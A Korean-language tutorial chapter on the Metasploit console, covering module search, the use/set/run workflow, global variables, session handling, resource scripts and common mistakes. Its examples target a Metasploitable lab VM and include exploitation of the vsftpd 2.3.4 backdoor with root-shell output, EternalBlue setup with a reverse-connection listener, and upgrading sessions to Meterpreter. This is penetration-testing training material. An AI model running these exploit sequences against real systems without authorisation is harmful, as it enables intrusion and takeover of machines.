Chapter 03

MSF 콘솔 기초

msfconsole의 모든 것 — 모듈 탐색부터 옵션 설정, 세션 관리, 자동화 스크립트까지, 콘솔을 자유자재로 다루는 법

🖥️ msfconsole이 특별한 이유

처음 msfconsole을 켜면 익숙한 셸 프롬프트처럼 보입니다. 하지만 이것은 단순한 커맨드라인 인터페이스가 아닙니다. msfconsole은 Metasploit의 모든 기능에 접근하는 통합 인터페이스이자, 루비 기반의 인터프리터입니다.

무엇이 특별하냐고요? 탭 자동완성이 모듈 이름, 옵션 값, 심지어 모듈 파라미터에도 작동합니다. 내장 데이터베이스 명령으로 스캔 결과가 자동 저장됩니다. 변수를 설정해 여러 모듈에서 재사용할 수 있습니다. 그리고 리소스 스크립트(.rc)를 통해 반복 작업을 자동화할 수도 있습니다.

🚀 msfconsole 시작 및 초기 화면 
# 일반 시작 (배너 포함)
msfconsole

# 조용히 시작 (배너 없음, 스크립트에 유용)
msfconsole -q

# 리소스 파일 로드하여 시작
msfconsole -r /path/to/setup.rc

# 시작 화면 프롬프트
       =[ metasploit v6.x.x-dev                          ]
+ -- --=[ 2200+ exploits - 1100+ auxiliary - 400+ post  ]
+ -- --=[ 500+ payloads - 45 encoders - 11 nops         ]
+ -- --=[ 9 evasion                                     ]
        
msf6 > _

🔍 모듈 탐색 — 원하는 도구 찾기

2,000개가 넘는 모듈 중에서 필요한 것을 찾으려면 체계적인 검색 방법이 필요합니다. Metasploit의 search 명령어는 생각보다 훨씬 강력합니다.

❌ 비효율적인 방법 
# 이렇게 하면 결과가 너무 많아서 찾기 어려움
msf6 > search windows
# → 수백 개의 결과, 어떤 걸 써야 할지 모름
✅ 효과적인 검색 방법 
# CVE 번호로 검색 (가장 정확)
msf6 > search cve:2017-0144
# MS17-010 EternalBlue 결과 출력

# 서비스 이름으로 검색
msf6 > search type:exploit name:smb

# 플랫폼 + 이름 조합
msf6 > search platform:windows type:exploit eternal

# 랭크별 필터 (excellent만 표시)
msf6 > search rank:excellent vsftpd

# 검색 결과 예시
#  #  Name                                  Disclosure Date  Rank       Check  Description
#  -  ----                                  ---------------  ----       -----  -----------
#  0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor

search 필터 키워드 완전 정리

키워드 예시 설명
name: search name:eternalblue 모듈 이름에 포함된 문자열
type: search type:auxiliary exploit, auxiliary, post, payload
platform: search platform:linux windows, linux, osx, android
cve: search cve:2021-44228 CVE 번호 (Log4Shell 등)
rank: search rank:excellent great, excellent, good, normal, average
author: search author:hdmoore 모듈 작성자 이름

⚙️ 모듈 사용 워크플로우

모듈을 찾았다면, 이제 사용하는 과정을 배울 차례입니다. 이 워크플로우는 Metasploit의 거의 모든 작업에서 반복됩니다. 몸에 익을 때까지 반복하세요.

🔨 표준 모듈 사용 플로우 
# 1단계: 모듈 선택 (use)
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) >
# 프롬프트가 바뀌었습니다 — 현재 모듈이 표시됩니다

# 2단계: 모듈 정보 확인 (info)
msf6 exploit(vsftpd_234_backdoor) > info
# 취약점 설명, 참조 링크, 사용 가능한 옵션이 모두 표시됩니다

# 3단계: 옵션 확인 (show options 또는 options)
msf6 exploit(vsftpd_234_backdoor) > show options

# Module options (exploit/unix/ftp/vsftpd_234_backdoor):
#    Name    Current Setting  Required  Description
#    ----    ---------------  --------  -----------
#    RHOSTS                   yes       The target host(s)
#    RPORT   21               yes       The target port (TCP)

# 4단계: 옵션 설정 (set)
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(vsftpd_234_backdoor) > set RPORT 21

# 5단계: 익스플로잇 실행
msf6 exploit(vsftpd_234_backdoor) > run
# 또는: exploit

# 성공 시 출력:
[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
💡
check 명령어 활용하기

일부 모듈은 check 명령어를 지원합니다. 실제로 익스플로잇을 실행하기 전에 대상이 해당 취약점에 취약한지 먼저 확인할 수 있습니다. 실제 침투 테스트에서 불필요한 시스템 손상을 방지하는 데 중요합니다.

🌍 전역 변수 — setg와 unsetg

같은 타깃에 대해 여러 모듈을 연속으로 사용할 때, 매번 RHOSTS를 다시 설정하는 것은 매우 번거롭습니다. 전역 변수(setg)를 사용하면 한 번 설정한 값이 모든 모듈에서 자동으로 사용됩니다.

❌ 비효율적 방식 — 매번 설정 
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.56.101
msf6 > run

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.56.101  # 또 똑같이 설정...
msf6 > set LHOST 192.168.56.100   # 또...
✅ setg로 전역 설정 
# 한 번 설정하면 모든 모듈에서 공유됨
msf6 > setg RHOSTS 192.168.56.101
msf6 > setg LHOST 192.168.56.100
msf6 > setg LPORT 4444

# 이제 어떤 모듈을 로드해도 이 값들이 자동으로 적용됨
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options
# RHOSTS는 이미 192.168.56.101로 채워져 있음

# 전역 변수 해제
msf6 > unsetg RHOSTS

# 현재 설정된 전역 변수 확인
msf6 > get RHOSTS

📋 세션 관리

여러 타깃에 동시에 침투해 있을 때, 또는 여러 개의 Meterpreter 세션을 열어둔 상태에서 작업을 전환하는 방법을 알아야 합니다. 세션 관리는 실전 침투 테스트에서 핵심 기술입니다.

🔨 세션 관리 명령어 
# 활성 세션 목록 확인
msf6 > sessions
# Active sessions
# ===============
#   Id  Name  Type               Information                    Connection
#   --  ----  ----               -----------                    ----------
#   1         meterpreter x86/linux  root @ metasploitable    192.168.56.100:4444 → 192.168.56.101:51234
#   2         shell cmd/unix     uid=0(root)                  192.168.56.100:5555 → 192.168.56.101:51235

# 특정 세션으로 들어가기
msf6 > sessions -i 1

# 세션에서 백그라운드로 빠져나오기
meterpreter > background
# 또는 Ctrl+Z

# 세션 종료
msf6 > sessions -k 2

# 모든 세션 종료
msf6 > sessions -K

# 세션에서 직접 명령 실행 (들어가지 않고)
msf6 > sessions -c "whoami" -i 1

# 세션 업그레이드 (일반 셸 → Meterpreter)
msf6 > sessions -u 2

📜 리소스 스크립트 — 작업 자동화

같은 작업을 반복하게 된다면, 리소스 스크립트(.rc 파일)로 자동화할 수 있습니다. msfconsole 명령어들을 파일에 저장하면, 다음에 실행할 때 한 줄씩 자동으로 실행됩니다. CI/CD 파이프라인에 침투 테스트를 통합하거나, 정기적인 취약점 검사를 자동화할 때 유용합니다.

➕ 자동화 리소스 스크립트 예시 
# /home/kali/lab_setup.rc 파일 내용
# 이 스크립트는 Metasploitable 2에 대한 기본 정찰을 자동화합니다

setg RHOSTS 192.168.56.101
setg LHOST 192.168.56.100

# 워크스페이스 설정
workspace -a metasploitable_lab
workspace metasploitable_lab

# Nmap 스캔 (결과가 DB에 자동 저장됨)
db_nmap -sV -sC -O 192.168.56.101

# SMB 버전 스캔
use auxiliary/scanner/smb/smb_version
run

# FTP 익명 접근 확인
use auxiliary/scanner/ftp/anonymous
run

back

# 스크립트 실행 방법:
# msfconsole -r /home/kali/lab_setup.rc
# 또는 콘솔 내에서: resource /home/kali/lab_setup.rc
💡
현재 세션의 명령 히스토리를 스크립트로 저장

makerc /path/to/output.rc 명령어를 사용하면 현재 msfconsole 세션에서 입력한 명령어들이 자동으로 .rc 파일로 저장됩니다. 성공적인 침투 과정을 재현 가능한 스크립트로 문서화하는 데 유용합니다.

⚠️ 자주 하는 실수들

❌ LHOST를 127.0.0.1로 설정하는 실수 ▼

LHOST는 타깃이 역방향 연결(reverse connection)을 보내올 주소입니다. 127.0.0.1(로컬호스트)로 설정하면 타깃은 자기 자신에게 연결을 시도합니다. 반드시 공격자 VM의 실제 IP (예: 192.168.56.100)를 설정해야 합니다.

✅ 올바른 LHOST 확인 및 설정 
# Kali에서 자신의 IP 확인
ip addr show eth0 | grep "inet " | awk '{print $2}'
# 또는
hostname -I

# 확인된 IP로 설정
msf6 > setg LHOST 192.168.56.100
❌ RHOSTS vs RHOST 혼동 ▼

일부 오래된 모듈은 RHOST(단수), 최신 모듈은 RHOSTS(복수)를 사용합니다. RHOSTS는 여러 IP를 받을 수 있습니다 (예: 192.168.56.1-254, 192.168.56.0/24). show options에서 어떤 이름인지 반드시 확인하세요.

❌ 모듈 로드 후 페이로드 확인 안 하기 ▼

익스플로잇 모듈을 로드하면 기본 페이로드가 자동으로 선택됩니다. 하지만 이 기본 페이로드가 항상 최선은 아닙니다. show payloads 명령으로 해당 익스플로잇과 호환되는 페이로드 목록을 확인하고, 상황에 맞는 것을 선택하는 습관을 들이세요.

✅ 페이로드 확인 및 변경 
msf6 exploit(vsftpd_234_backdoor) > show payloads
# 호환 페이로드 목록 출력

msf6 exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
